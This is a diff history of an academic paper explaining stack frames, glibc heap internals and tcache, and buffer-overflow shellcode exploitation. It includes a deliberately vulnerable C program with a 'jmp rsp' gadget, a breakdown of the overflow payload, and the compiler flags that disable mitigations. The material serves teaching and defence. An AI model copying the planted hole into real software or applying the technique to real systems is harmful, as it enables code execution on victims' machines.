+The abuse of the inherent trust in software development and delivery chains to spread narratives or cause disruption highlights the crucial need for encompassing security measures to ensure digital infrastructure integrity.
+An example of this modern method of protest is the case of the \emph{NPM} package \emph{node-ipc}\cite{LunaSec}.
+In this case, a disgruntled package maintainer added malicious code to this package, causing the program to delete all the files on the machine if its public IP address was detected to be from Russia or Belarus.
+
+In~\cite{LunaSec}, the authors discuss methods of preventing these kinds of attacks in the future.
+The one that is the most interesting to us \emph{Dependency Sandboxes}.
+This strategy would limit the capabilities of software packages to the minimum they require to function.
+It would allow for a more streamlined auditing pipeline by focusing the audits on packages with destructive capabilities, such as system-wide file access.
+
+\subsubsection{Mixing control data with user data}
+The stack is a fundamental data structure in modern computing systems, and its use in x64 systems is exciting due to the specific features and operations enabled by the x64 architecture.
+The stack is typically organized as a contiguous memory region with two key pointers: the stack base pointer (RBP in x64) and the stack pointer (RSP in x64).
+The stack grows `downward' in memory, meaning that as new items are pushed onto the stack, the stack pointer decreases in value.
+A typical function call on an x64 system involves pushing the return address onto the stack, followed by the function's parameters \footnote{In the most common calling convention, the first few parameters are passed in registers, not through the stack}, and finally, the local variables.
+These elements are popped from the stack in reverse order upon function return, ensuring correct program execution.
+However, the direct memory access afforded by the stack also presents a potential vector for exploitation, with techniques such as buffer overflow attacks targeting this fundamental structure.
+Consequently, understanding the stack's functioning in x64 systems is crucial for building and securing software systems.
 
@@
   \end{tikzpicture}
-  \caption{\label{fig:label} Stack frame of a function with local variables
+  \caption{\label{fig:stackfame-example} Stack frame of a function with local variables
     `foo' and `bar'}%
-  \label{fig:stackframe}
 \end{figure}
 
-An example state of the stack during the call~\footnote{This example is used for
-simplicity. In real world scenarios the variables would have been constant
-propagated and the function would have directly returned the result of the
-computation} to the function `example`~\ref{code:example_func} is shown in~\ref{fig:stackframe}.
-
-\begin{lstlisting}
+An example state of the stack during the call~\footnote{This example is used for simplicity.
+In real world scenarios the variables would have been constant propagated and the function would have directly returned the result of the computation} to the function `example`~\ref{code:example_func} is shown in~\ref{fig:stackfame-example}.
+
+\begin{lstlisting}[
+      ,label={lst:examplefn}
+      ,language=C]
   int example()
@@
 
-We can see that the stack frame contains some interesting `variables' that we
-haven't defined ourselves:
+We can see that the stack frame contains some interesting values that we haven't defined ourselves:
 \begin{itemize}
   \item \textbf{RBP} -~Base pointer. This has been historically used to keep
-        track of the start (or base) of our function's stack frame.
-Functions are usually not allowed to modify values above this address (even though there are some exceptions like copy ellision TODO add copy elision ref).
+        track of the start (or base) of our function's stack frame. Functions are usually not allowed to modify values above this address.
   \item \textbf{Old RBP} -~Base pointer of the caller.
-  \item \textbf{Stack canary} -~This will be explained in the mitigations section TODO add mitigations ref, we will ignore it for this example.
+  \item \textbf{Stack canary} -~A random value. The purpose of this is discussed in a later chapter.
   \item \textbf{Return address} -~For our purposes this is the most important variable.
@@
 \end{itemize}
-
-Now that we have an understanding of how a stack frame looks we can move on to
-how stack frames are linked together. The example below shows the state of the
-stack while executing the following nested function call chain~\footnote{Here foo is assumed to be a function that does not return} (the
-`calls' operation is denoted by $\Rightarrow$):
-
-\begin{equation}
-  foo \Rightarrow bar \Rightarrow baz \Rightarrow qux
-\end{equation}
-
-This structure is basically a singly linked list of stack frames, with \emph{RBP} as their forward pointer.
-The function the processor is currently executing is at the head of the list, and the first function called by the program is situated at the tail.
-Because user variables are mixed with control structures, we can imagine what the outcome would be if we managed to corrupt the \emph{forward} pointer in this linked list.
 
@@
   \end{tikzpicture}
-  \caption{\label{fig:label} Stack state when executing 3 nested calls}%
-  \label{fig:stackframe}
+  \caption{\label{fig:stacksample} Stack state when executing 3 nested calls}%
 \end{figure}
+
+Now that we understand how a stack frame looks, we can move on to how stack frames are linked together.
+This\ref{fig:stacksample} example below shows the state of the stack while executing the following nested function call chain~\footnote{Assuming that foo does not return} (the `calls' operation is denoted by '$\Rightarrow$`):
+
+\begin{equation}
+  foo \Rightarrow bar \Rightarrow baz \Rightarrow qux
+\end{equation}
+
+This structure is a singly linked list of stack frames, with \emph{RBP} as their forward pointer.
+The function the processor executes is at the head of the list, and the first function called by the program is situated at the tail.
+Because user variables are mixed with control structures, we can imagine the outcome if we managed to corrupt the \emph{forward} pointer in this linked list.
 
@@
 
-\subsection{GLibc allocation algorithm}
-\subsubsection{Background}
+\subsubsection{GLibc allocation algorithm}
 \begin{itemize}
@@
 as we also strive to improve defenses against human-targeted
-exploits.\cite{jones2021}\cite{smith2022}
+exploits.
 
@@
 \printbibliography
-\printbibliography[nottype=book,heading=subbibliography,title={Other Sources}]
 \end{document}

### 2023-06-26 paper.tex
mememeememme

@@
 \usepackage{xcolor}
+\usepackage[margin=2.54cm]{geometry}
 \usepackage[utf8]{inputenc}
 \usepackage[english]{babel}
+\usepackage{float}
+\usepackage[toc,page]{appendix}
 
 \usepackage[backend=biber,style=numeric]{biblatex}
+
 \addbibresource{references.bib} % Import the bibliography file
 
+\setcounter{secnumdepth}{4} % how many sectioning levels to assign numbers to
+\setcounter{tocdepth}{4}    % how many sectioning levels to show in ToC
 \lstset{
@@
 \maketitle
+
+\tableofcontents
+
 \section{Abstract}%
@@
 For example, let us take the venerable Buffer Overflow vulnerability, in which an attacker can send more data than the application has space to process, resulting in Undefined Behaviour.
+
 Depending on the scenario, this undefined behavior can be exploited to redirect the execution flow of the program into code sent by the attacker (in the case of a code injection attack on the stack) or could lead to corrupting some necessary metadata somewhere else in the program (overwriting a password variable to one you control, allowing you to login without knowing the actual password).
@@
 In modern software, having a programming language without a package manager is a show-stopper.
+
 Package managers have allowed developers to share and reuse code more efficiently, increasing productivity and democratization of writing excellent and valuable software.
@@
 
-\subsubsection{Mixing control data with user data}
+\subsection{Mixing control data with user data}
 The stack is a fundamental data structure in modern computing systems, and its use in x64 systems is exciting due to the specific features and operations enabled by the x64 architecture.
@@
 
-\begin{figure}[ht]%
+\begin{figure}[H]%
   \centering
@@
 
-An example state of the stack during the call~\footnote{This example is used for simplicity.
-In real world scenarios the variables would have been constant propagated and the function would have directly returned the result of the computation} to the function `example`~\ref{code:example_func} is shown in~\ref{fig:stackfame-example}.
-
 \begin{lstlisting}[
+      caption={Example function},
       ,label={lst:examplefn}
@@
 \end{lstlisting}%
-\label{code:example_func}
+
+An example state of the stack during the call~\footnote{This example is used for simplicity.
+In real world scenarios the variables would have been constant propagated and the function would have directly returned the result of the computation} to the function `example` Listing~\ref{lst:examplefn} is shown in Figure~\ref{fig:stackfame-example}.
 
@@
 Now that we understand how a stack frame looks, we can move on to how stack frames are linked together.
-This\ref{fig:stacksample} example below shows the state of the stack while executing the following nested function call chain~\footnote{Assuming that foo does not return} (the `calls' operation is denoted by '$\Rightarrow$`):
+Figure~\ref{fig:stacksample} shows the state of the stack while executing the following nested function call chain~\footnote{Assuming that foo does not return} (the `calls' operation is denoted by '$\Rightarrow$`):
 
@@
 
-\subsubsection{Anatomy of the Heap}
-Here we will take a small departure
-from the world of semi-standardized calling conventions and venture in the
-implementation defined lands of \emph{malloc} and \emph{free}. Ever since it's
-inception, this api has been the bane of every C programmer's existence when
-they started out programming. We will now examine in depth this API.\@
+On the \emph{x86-64} platform, returning from a function can be usually abstracted to this algorithm:
+\begin{enumerate}
+  \item Move the current \emph{RPB} into \emph{RSP} (free-ing the current stack frame)
+  \item Pop the value of \emph{Old RBP} from the stack into \emph{RBP} (restoring the caller's stack frame)
+  \item Pop the \emph{Return address} into the instruction pointer (continuing execution)
+\end{enumerate}
+
+It is important to state again that in vulnerable programs, it is possible to modify the value of the return address on the stack due to improper input validation and bounds checking.
+
+Another interesting fact about the Stack is that compilers are usually reluctant to put variables whose size is not known at compile time on the stack\footnote{Ways to achieve this exist, such as VLA's (Variable Length Arrays) or standard functions such as \emph{alloca}, but their uses is discouraged\cite{TorvaldsVLA}}.
+The data allocated on the Stack also only lives for as long as the function it was allocated (or any other callee of that function) is being executed.
+
+\subsection{Anatomy of the Heap}
+The Heap does not suffer from the same limitations as the Stack.
+Allocations made on the Heap can be programmatically free'd, instead of being managed by the compiler.
+The API for interacting with the Heap is simple:
+\begin{itemize}
+  \item \texttt{malloc} - Allocates a chunk of memory that can store the desired size
+  \item \texttt{free} - Mark an allocation as free for reuse
+\end{itemize}
+
+Although there are more functions that interact with the system Heap this paper mainly focuses on these main 2.
 
 \subsubsection{malloc}
-TODO add ref to standards
-The malloc function is a part of the C Standard Library, as specified by both
-the ANSI C and ISO C standards. It is used for dynamic memory allocation in C
-programs, allowing the programmer to request a specific amount of memory space
-at runtime. The malloc function, defined in the stdlib.h header file, takes a
-single argument: the number of bytes to be allocated, and it returns a pointer
-to the first byte of the allocated space.
-
-The behavior of malloc is strictly defined by the C standard. Upon successful
-execution, malloc provides a block of memory that is suitably aligned for any
-kind of variable. The allocated memory is uninitialized, meaning it contains
-indeterminate values. If the function fails to allocate the requested memory,
-perhaps due to insufficient memory space, it returns a NULL pointer.
-Importantly, the standard guarantees that malloc will not modify the content of
-the allocated memory, which differentiates it from similar functions like
-calloc, which sets the allocated memory to zero. The pointer returned by malloc
-is always a unique address that is not being used elsewhere in the program,
-until it is freed by the \emph{free} function.
+The C standard~\cite[p.~154-157]{ANSI_C} strictly defines the behavior of malloc and free.
+Upon successful execution, malloc provides a block of memory suitably aligned for any variable.
+The allocated memory is uninitialized, meaning it contains indeterminate values.
+If the function fails to allocate the requested memory, perhaps due to insufficient memory space, it returns a NULL pointer.
+Notably, the standard guarantees that malloc will not modify the allocated memory's content, differentiating it from similar functions like calloc, which sets the allocated memory to zero.
+The pointer returned by malloc is always a unique address not being used elsewhere in the program until it is freed by the \emph{free} function.
 
 \subsubsection{free}
-Thre \emph{free} function pretty much does the inverse of what malloc does. It
-marks the memory allocation starting at the address given as a parameter as free
-for use by the allocator. The algorithm behind the dynamic memory allocation API
-is left to be implementation defined. We will dig deeper into the
-allocator used by LibC on the GNU/Linux operating system.
+The \emph{free} function pretty much does the inverse of what malloc does.
+It marks the memory allocation starting at the address given as a parameter as free for use by the allocator.
+The algorithm behind the dynamic memory allocation API is left to be implementation-defined.
+We will dig deeper into the allocator used by LibC on the GNU/Linux operating system.
 
 \subsection{Allocating memory in Linux}
-The allocator used by the C standard library on linux is a variation of
-\emph{ptmalloc}. There are two main ways to allocate memory using this
-allocator. The allocator automatically chooses which technique to use based on
-the size of the requested allocation\footnote{We will be referring to
-allocations with a size $<$ {M\_MMAP\_THRESHOLD} as \emph{small} and to
-allocations larger than that as \emph{big}}\footnote{{M\_MMAP\_THRESHOLD} is set
-to 127k bytes by default}:
+The allocator used by the C standard library (GLibC) on Linux is a variation of \emph{ptmalloc}.
+There are two main ways to allocate memory using this allocator.
+The allocator automatically chooses which technique to use based on the size of the requested allocation\footnote{We will be referring to allocations with a size $<$ {M\_MMAP\_THRESHOLD} as \emph{small} and to allocations larger than that as \emph{big}}\footnote{{M\_MMAP\_THRESHOLD} is set to 127k bytes by default}:
 \begin{itemize}
@@
 
-Large allocations bypass the allocation algorithm entirely (and will not be the
-focus for our exploitation scenarios), unlike small allocations which pass
-trough a pretty complex set of steps before the memory is actually given to us.
-We will now discuss this algorithm in detail, pointing out areas of interest
-that will help us develop exploits and mitigations later.
-
-\subsubsection{GLibc allocation algorithm}
+Large allocations bypass the allocation algorithm entirely (and will not be the focus of our exploitation scenarios), unlike small allocations, which pass through a pretty complex set of steps before the memory is given to us.
+We will discuss this algorithm in detail, highlighting areas of interest that will help us develop exploits and mitigations later.
+
+The allocation algorithm is described in depth in~\cite{MallocInternals}. We will mainly be exploring the \emph{tcache} part of the algorithm.
+
+Definitions:
 \begin{itemize}
-  \item \emph{Arena}~-~An arena is a structure accessible by one or multiple
-threads, holding references to one or several heaps. It also includes linked
-lists of unallocated `chunks' within these heaps. Threads associated with a
-specific arena draw their memory from the free lists of that arena.
-  \item \emph{Heap}~-~A heap is a sequential memory region divided into smaller
-units, known as chunks, for allocation purposes. Each heap is uniquely
-associated with a single arena.
+  \item \emph{Arena}~-~An arena is a structure accessible by one or multiple threads, holding references to one or several heaps.
+It also includes linked lists of unallocated `chunks' within these heaps.
+Threads associated with a specific arena draw their memory from the free lists of that arena.
+  \item \emph{Heap}~-~A heap is a sequential memory region divided into smaller units, known as chunks, for allocation purposes. Each heap is uniquely associated with a single arena.
   \item \emph{Chunk}~-~A chunk represents a small, allocatable memory section.
-This memory can be allocated (controlled by the application), freed (controlled
-by glibc), or merged with nearby chunks to create larger sections. Importantly,
-a chunk essentially serves as a shell encompassing the block of memory delivered
-to the application. Every chunk is part of one heap and linked to a single
-arena.
-  \item \emph{Memory}~-~Memory refers to a segment of the application's address
-space, generally supported by RAM or swap
+This memory can be allocated (controlled by the application), freed (controlled by glibc), or merged with nearby chunks to create larger sections.
+Importantly, a chunk essentially serves as a shell encompassing the block of memory delivered to the application.
+Every chunk is part of one heap and linked to a single arena.
+  \item \emph{Memory}~-~Memory refers to a segment of the application's address space, generally supported by RAM or swap
 \end{itemize}
@@
 \subsubsection{Allocation}
-The operation of the \texttt{malloc} function can be succinctly described as
-follows:
+The operation of the \texttt{malloc} function can be succinctly described as follows:
 
 \begin{enumerate}
-\item In case a chunk with an exact match is available in the \texttt{tcache},
-it is returned. Note that no attempts are made to utilize an existing chunk from
-a bin of a larger size.
-
-\item For sufficiently large requests, memory is directly acquired from the
-operating system using the \texttt{mmap()} function. It is noteworthy that the
-threshold for triggering \texttt{mmap()} is dynamic, subject to the
-\texttt{M\_MMAP\_THRESHOLD} parameter (refer to the \texttt{mallopt()}
-documentation), and there may exist a constraint on the number of mappings
-permissible concurrently.
-
-\item If an adequate chunk exists in the appropriate \texttt{fastbin}, it is
-used. If additional chunks are available, the \texttt{tcache} is prefilled.
-
-\item In the scenario where the appropriate \texttt{smallbin} contains a chunk,
-it is used, with the possibility of \texttt{tcache} being prefilled.
-
-\item For "large" requests, the function executes a routine to transfer all
-elements in the \texttt{fastbins} to the unsorted bin while coalescing them.
-
-\item The function then starts retrieving chunks from the unsorted list,
-subsequently placing them into small/large bins, again coalescing in the
-process. The function uses a chunk if it is of the required size. This is the
-only point in the code where chunks are inserted into small/large bins.
-
-\item In the case of "large" requests, the function searches the appropriate
-large bin and subsequently larger bins until a sufficiently large chunk is
-found.
-
-\item If chunks remain in the \texttt{fastbins} (which could occur for "small"
-requests), these are consolidated, and the previous two steps are repeated.
-
-\item Part of the "top" chunk is split off, with a possibility of enlarging the
-"top" chunk prior to this.
-
-\item For requests requiring over-aligned \texttt{malloc}, such as
-\texttt{valloc}, \texttt{pvalloc}, or \texttt{memalign}, an overly-large chunk
-is located using the above \texttt{malloc} algorithm. This chunk is then divided
-into two or more chunks such that the majority of the chunk is suitably aligned
-and returned to the caller. The excess portions before and after this chunk are
-returned to the unsorted list for future usage.
+  \item In case a chunk with an exact match is available in the \texttt{tcache}, it is returned. Note that no attempts are made to utilize an existing chunk from a bin of a larger size.
+
+  \item For sufficiently large requests, memory is directly acquired from the operating system using the \texttt{mmap()} function.
+It is noteworthy that the threshold for triggering \texttt{mmap()} is dynamic, subject to the \texttt{M\_MMAP\_THRESHOLD} parameter (refer to the \texttt{mallopt()} documentation), and there may exist a constraint on the number of mappings permissible concurrently.
+
+  \item If an adequate chunk exists in the appropriate \texttt{fastbin}, it is used. If additional chunks are available, the \texttt{tcache} is prefilled.
+
+  \item In the scenario where the appropriate \texttt{smallbin} contains a chunk, it is used, with the possibility of \texttt{tcache} being prefilled.
+
+  \item For "large" requests, the function executes a routine to transfer all elements in the \texttt{fastbins} to the unsorted bin while coalescing them.
+
+  \item The function then starts retrieving chunks from the unsorted list, subsequently placing them into small/large bins, again coalescing in the process.
+The function uses a chunk if it is of the required size.
+This is the only point in the code where chunks are inserted into small/large bins.
+
+  \item In the case of "large" requests, the function searches the appropriate large bin and subsequently larger bins until a sufficiently large chunk is found.
+
+  \item If chunks remain in the \texttt{fastbins} (which could occur for "small" requests), these are consolidated, and the previous two steps are repeated.
+
+  \item Part of the "top" chunk is split off, with a possibility of enlarging the "top" chunk prior to this.
 \end{enumerate}
 
-\subsubsection{Free} Generally, the act of "freeing" memory does not entail
-returning it to the operating system for alternative applications' use. A
-\texttt{free()} call designates a memory chunk as "available for reuse" by the
-application; from the perspective of the operating system, the memory still
-"belongs" to the application. However, should the top chunk in a heap -- the
-section adjacent to unmapped memory -- grow significantly, some of the memory
-could potentially be unmapped and returned to the operating system.
+\subsubsection{Free}
+Generally, the act of "freeing" memory does not entail returning it to the operating system for alternative applications' use.
+A \texttt{free()} call designates a memory chunk as "available for reuse" by the application; from the perspective of the operating system, the memory still "belongs" to the application.
+However, should the top chunk in a heap -- the section adjacent to unmapped memory -- grow significantly, some of the memory could potentially be unmapped and returned to the operating system.
 
@@
 
+\subsubsection{tcache}
+Here is a more in-depth analysis of the \emph{tcache} functionality.
+This feature was introduced in GLibC in order to speed up the allocation of small, short-lived objects from multiple threads simultaneously.
+This part of the algorithm is the only one that is thread-local, the others requiring a lock on the process' Arena or atomic operations.
+
+\texttt{tcache} intercepts the calls made to the \emph{free} function and stores these allocations in singly linked lists named tcache buckets.
+Each bucket can store a range of allocation sizes.
+When calling \emph{malloc} with tcache enabled, the first step is to check the appropriately sized tcache bucket for an allocation that might satisfy our requirements.
+If an allocation is found, it is removed from the singly linked list and returned.
+
+\begin{figure}[ht]%
+  \centering
+  \begin{tikzpicture}[node distance=2cm]
+    \tikzstyle{block} = [rectangle, draw, fill=blue!20, text width=5em, text
+    centered, minimum height=2em, text width=2cm,
+               text depth=0.25cm,
+               text height=1em,
+               align=center]
+    \tikzstyle{line} = [draw, -latex']
+
+    % Define matrix
+    \matrix [matrix of nodes,
+    nodes=block,
+    column sep=0cm,
+    row sep=0cm
+    ] (m1) {
+      $alloc_{0}$ & |[fill=white, draw=white]| \phantom{} & |[fill=white, draw=white]| \phantom{} \\
+    };
+
+    \matrix [matrix of nodes,
+    below = 1cm of m1,
+    nodes=block,
+    column sep=0cm,
+    row sep=0cm
+    ] (m2) {
+      $alloc_{1}$ & |[fill=white, draw=white]| \phantom{} & $alloc_{2}$ \\
+    };
+
+    \matrix [matrix of nodes,
+    below = 1cm of m2,
+    nodes=block,
+    column sep=0cm,
+    row sep=0cm
+    ] (m3) {
+      $bucket_{0}(2)$ & $bucket_{1}(0)$ & $bucket_{2}(1)$ \\
+    };
+
+    \draw[->] (m3-1-1) -- (m2-1-1);
+    \draw[->] (m2-1-1) -- (m1-1-1);
+    \draw[->] (m3-1-3) -- (m2-1-3);
+  \end{tikzpicture}
+  \caption{\label{fig:tcache} Sample tcache state}%
+\end{figure}
+
+The example in Figure~\ref{fig:tcache} is a sample tcache state after executing the following instruction sequqence:
+\begin{enumerate}
+  \item $free(alloc_{2})$
+  \item $free(alloc_{0})$
+  \item $free(alloc_{1})$
+\end{enumerate}
+Let's say we want to make an allocation that would fit inside $bucket_{0}$.
+The tcache algorithm would pull out that allocation from the list and return it to us, while updating the head of the list with the address of $alloc_{0}$.
+
+\begin{figure}[ht]%
+  \centering
+  \begin{tikzpicture}[node distance=2cm]
+    \tikzstyle{block} = [rectangle, draw, fill=blue!20, text width=5em, text
+    centered, minimum height=2em, text width=2cm,
+               text depth=0.25cm,
+               text height=1em,
+               align=center]
+    \tikzstyle{line} = [draw, -latex']
+
+    \matrix [matrix of nodes,
+    below = 1cm of m1,
+    nodes=block,
+    column sep=0cm,
+    row sep=0cm
+    ] (m2) {
+      $alloc_{0}$ & |[fill=white, draw=white]| \phantom{} & $alloc_{2}$ \\
+    };
+
+    \matrix [matrix of nodes,
+    below = 1cm of m2,
+    nodes=block,
+    column sep=0cm,
+    row sep=0cm
+    ] (m3) {
+      $bucket_{0}(1)$ & $bucket_{1}(0)$ & $bucket_{2}(1)$ \\
+    };
+
+    \draw[->] (m3-1-1) -- (m2-1-1);
+    \draw[->] (m3-1-3) -- (m2-1-3);
+  \end{tikzpicture}
+  \caption{\label{fig:tcache} Sample tcache state after malloc}%
+\end{figure}
+
+How does \emph{tcache} store the links between the allocations?
+
+\begin{figure}[ht]%
+  \centering
+  \begin{tikzpicture}[node distance=2cm]
+    \tikzstyle{block} = [rectangle, draw, fill=blue!20, text width=5em, text
+    centered, minimum height=2em, text width=2cm,
+               text depth=0.25cm,
+               text height=1em,
+               align=center]
+    \tikzstyle{line} = [draw, -latex']
+
+    \matrix [matrix of nodes,
+    below = 1cm of m1,
+    nodes=block,
+    column sep=0cm,
+    row sep=0cm
+    ] (m2) {
+      fd & key & ... \\
+    };
+
+    \draw[->]  ([yshift=1cm]m2-1-1.north west)  -- node [midway, above, sloped, rotate=90, left=0.3cm] {start of alloc} (m2-1-1.north west);
+  \end{tikzpicture}
+  \caption{\label{fig:tcachechunk} Sample tcache entry}%
+\end{figure}
+
+The example in Figure~\ref{fig:tcachechunk} showcases how \emph{tcache} uses the allocated memory to store the required metadata to function.
+The value of the \emph{fd} contains the address of the next available allocation or \emph{NULL} if no other allocations are available.
+By default, each bucket contains a singly linked list of at most seven elements.
+
+The \emph{key} value prevents freeing the same allocation twice.
+When the allocation is free, this value contains the address of the \emph{tcache\_perthread\_struct}.
+When the allocation is freed, this value is checked against the address of the per-thread struct, and if these values match, it means that the allocation has already been freed once, and the program aborts.
+
 \subsubsection{Detecting heap corruption}
-The \texttt{malloc} subsystem implements a series of measures aimed at detecting
-heap corruption throughout its codebase. Certain checks can consistently
-identify errors (for instance, passing an insufficiently aligned pointer to
-\texttt{free()}). However, the majority of these checks are heuristic and may
-not identify contrived, false chunks that mimic legitimate ones (for instance,
-checks for forward/backward linking of chunks). Consequently, heap corruption
-may persist undetected for an extended duration, or might not be reported
-altogether.
-
-Common forms of corruption are managed via calls to \texttt{malloc\_printerr};
-these checks are invariably included in the code. Additional checks utilize
-\texttt{assert} and can thus be disabled by building \texttt{glibc} with the
-\texttt{-DNDEBUG} flag. In the current \texttt{glibc} version, both types of
-checks terminate the process via a call to \texttt{\_\_libc\_message}, which
-ultimately invokes \texttt{abort}. Note that although very old versions of
-\texttt{glibc} offered the ability to continue execution in the presence of heap
-corruption, this feature has since been discontinued.
-
-In the following chapter we will be exploring ways to the bypass corruption checks
-in order to achieve arbitrary code execution.
+The \texttt{malloc} subsystem implements a series of measures to detect heap corruption throughout its codebase.
+Certain checks can consistently identify errors (for instance, passing an insufficiently aligned pointer to \texttt{free()}).
+However, most of these checks are heuristic and may not identify contrived, false chunks that mimic legitimate ones (for instance, checks for forward/backward linking of chunks).
+Consequently, heap corruption may persist undetected for an extended duration or not be reported.
+
+Typical forms of corruption are managed via calls to \texttt{malloc\_printerr}; these checks are invariably included in the code.
+Additional checks utilize \texttt{assert} and can thus be disabled by building \texttt{glibc} with the \texttt{-DNDEBUG} flag.
+In the current \texttt{glibc} version, both types of checks terminate the process via a call to \texttt{\_\_libc\_message}, which ultimately invokes \texttt{abort}.
+Note that although old versions of \texttt{glibc} offered the ability to continue execution in the presence of heap corruption, this feature has since been discontinued.
 
@@
 \section{Software Exploitation Techniques}%
-Software exploitation has been a prevalent issue almost as early as the
-inception of software itself, underpinning the need for constant vigilance and
-innovation in the field of software security. Early instances of software
-exploitation can be traced back to the late 1980s with the advent of the Morris
-Worm. Considered as one of the first computer worms distributed via the
-Internet, the Morris Worm infected approximately 6,000 computers, causing
-significant slowdowns or even rendering them unusable
-\cite{spafford1989internet}. Since then, various forms of software
-vulnerabilities have been exploited, including buffer overflows, injection
-attacks, and privilege escalation, leading to massive data breaches, disruptions
-in services, and significant financial losses \cite{owasp2017}. The history of
-software exploitation elucidates the perpetual arms race between attackers
-seeking to exploit vulnerabilities and defenders striving to secure systems, a
-dynamic that continues to define the software security landscape today.
+Software exploitation has been a prevalent issue almost as early as the inception of software itself, underpinning the need for constant vigilance and innovation in software security.
+Early instances of software exploitation can be traced back to the late 1980s with the advent of the Morris Worm.
+Considered one of the first computer worms distributed via the Internet, the Morris Worm infected approximately 6,000 computers, causing significant slowdowns or rendering them unusable \cite{spafford1989internet}.
+Since then, various software vulnerabilities have been exploited, including buffer overflows, injection attacks, and privilege escalation, leading to massive data breaches, service disruptions, and significant financial losses \cite{owasp2017}.
+The history of software exploitation elucidates the perpetual arms race between attackers seeking to exploit vulnerabilities and defenders striving to secure systems.
+This dynamic continues to define the software security landscape today.
 
@@
 \end{comment}
-One of the earliest vulnerability that was exploited was the venerable bufffer
-overflow. A Buffer overflow represents a crucial class of software
-vulnerabilities that can serve as a launching pad for a myriad of complex
-exploits, one of which includes shellcode injection. This vulnerability arises
-when more data is written to a buffer than it can hold, thereby allowing an
-attacker to overwrite adjacent memory locations \cite{seacord2013}. If exploited
-judiciously, this can lead to the alteration of program's control flow, enabling
-an attacker to execute arbitrary code. One manifestation of this is shellcoding,
-where an attacker injects a sequence of bytes, often encoding command-line shell
-instructions, into the memory and manipulates the program's execution flow to
-execute this code \cite{one1996smashing}. This capability to execute arbitrary
-code gives the attacker full control over the compromised system, thereby
-illustrating the severity and implications of buffer overflow vulnerabilities.
+One of the earliest vulnerabilities that were exploited was the buffer overflow.
+A Buffer overflow represents a crucial class of software vulnerabilities that can serve as a launching pad for a myriad of complex exploits, one of which includes shellcode injection.
+This vulnerability arises when more data is written to a buffer than it can hold, allowing an attacker to overwrite adjacent memory locations \cite{seacord2013}.
+If exploited judiciously, this can alter the program's control flow, enabling an attacker to execute arbitrary code.
+One manifestation of this is shellcoding, where an attacker injects a sequence of bytes, often encoding command-line shell instructions, into the memory and manipulates the program's execution flow to execute this code \cite{one1996smashing}.
+This capability to execute arbitrary code gives the attacker complete control over the compromised system, illustrating the severity and implications of buffer overflow vulnerabilities.
 
 Below \ref{lst:bof} is an example of a vulnerable program.
-
-\begin{minipage}{\linewidth}
-\begin{lstlisting}[caption={Buffer overflow shellcoding example}
-      ,label={lst:bof}
-      ,language=C]
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-
-/* This function is a gadget typically
- * found through Return Oriented Programming (ROP)
- * in a larger binary, and it's crucial
- * for changing control flow.
- * It serves to demonstrate the general
- * concept in this simplified context.
- *
- * In a real-life scenario,
- * it would be necessary to find this gadget
- * or pivot the stack in a different manner.
- */
-extern void __attribute__((naked)) helper_gadget() {
-        __asm(".intel_syntax noprefix\n"
-              "jmp rsp\n"
-              ".att_syntax\n");
-}
-
-/* Example of a vulnerable function in which
- * the size of the concatenated strings is not
- * checked to be less than the size of the
- * buffer in which they are concatenated.
- *
- * This would most likely never cause issues
- * because names are almost never this long, but
- * it is easy for an attacker to exploit this.
- */
-void say_hi(char* name) {
-        char local_buffer[0x100];
-
-        strcat(local_buffer, "Hi ");
-        strcat(local_buffer, name);
-        strcat(local_buffer, "!");
-
-        puts(local_buffer);
-
-        return;
-}
-
-int main(int argc, char** argv) {
-        if (argc != 2) {
-                fprintf(stderr, "usage: say_hi <name>\n");
-                return 1;
-        }
-
-        say_hi(argv[1]);
-
-        return 0;
-}
-\end{lstlisting}
-\end{minipage}
 
@@
 
-But running the program with the following malicious crafted input we get
-a vastly different result:
-
-\begin{lstlisting}[caption={Malicious input}
+But running the program with the following malicious crafted input we get a vastly different result\footnote{This would not happen in modern compilers because of mitigations enabled by default.
+The exact compilation flags required for this attack were: \texttt{-fno-stack-protector -z execstack -fno-pic -no-pie}}:
+\begin{lstlisting}[caption={Shellcode execution}
       ,label={lst:bof_malicious}
@@
 \end{lstlisting}
-Our simple program seems to be behaving like a system shell. We will now analyse
-what happened during the execution of our program. Here~\ref{lst:bof_malicous_hex}
-is a hexdump of the input. Let's break it down:
+Our simple program behaves like a system shell.
+We will now analyze what happened during the execution of our program.
+Here,~\ref {lst:bof_malicous_hex} is a hex dump of the input.
+Let us break it down:
 \begin{enumerate}
-  \item The first 0x100 bytes of the payload are just null bytes\footnote{We are
-  allowed to do this because \emph{gets} does not stop reading the string when it
-  encounters a \emph{NULL} (0) byte, even though strings in C are almost always
-  NULL terminated.~\emph{scanf} will only return when it encounters an error or
-  reads a line ending}. We do this in order to fill up the buffer that the
-  application uses. These values could realistically be anything (besides line
-  endings).
-  \item As shown in\ref{veziacistackuala} we now need to overflow the
-  \emph{base pointer}. In this exploitation scenario this can also be any value,
-  but it can allow us to pivot the stack into some memory address we know in some cases.
+  \item The first 0x100 bytes of the payload are just null bytes\footnote{We are allowed to do this because \emph{gets} does not stop reading the string when it encounters a \emph{NULL} (0) byte, even though strings in C are almost always NULL terminated.~\emph{scanf} will only return when it encounters an error or reads a line ending}.
+We do this in order to fill up the buffer that the application uses.
+These values could be anything (besides line endings).
+  \item As shown in\ref{veziacistackuala} we now need to overflow the \emph{base pointer}.
+This exploitation scenario allows us to place any value instead of the saved rbp (because it is not used), but it can allow us to pivot the stack into some memory address we know in some cases.
   \item Now we overwrite the \emph{return address} to point to the address of the \emph{jump rsp} instruction.
-  \item After the return address we place a \emph{nop sled}. The purpose of the nop
-  sled is to allow us some leeway\footnote{When jumping into shellcode written to the stack the addresses the stack register and instruction pointer point to are close together.
+  \item After the return address, we place a \emph{nop sled}.
+The purpose of the nop sled is to allow us some leeway\footnote{When jumping into shellcode written to the stack, the addresses the stack register and instruction pointer point to are close together.
 Stack manipulations (such as \emph{push}es and \emph{pop}s) can overwrite the shellcode, causing it to misbehave or making the processor execute illegal instructions.} when crafting the actual malicious payload.
-  \item Finally we place the instructions we want to execute. The payload exemplified\ref{vezipayload} here uses the \emph{execve} syscall to replace the current running
-  process with the \emph{sh} shell process.
+  \item Finally, we place the instructions we want to execute.
+The payload exemplified\ref{vezipayload} here uses the \emph{execve} syscall to replace the current running process with the \emph{sh} shell process.
 \end{enumerate}
 
-This traditional exploitation technique of buffer overflow into shellcode has
-been effectively mitigated by a plethora of defensive mechanisms that we will
-discuss in subsequent chapters, such as Address Space Layout Randomization
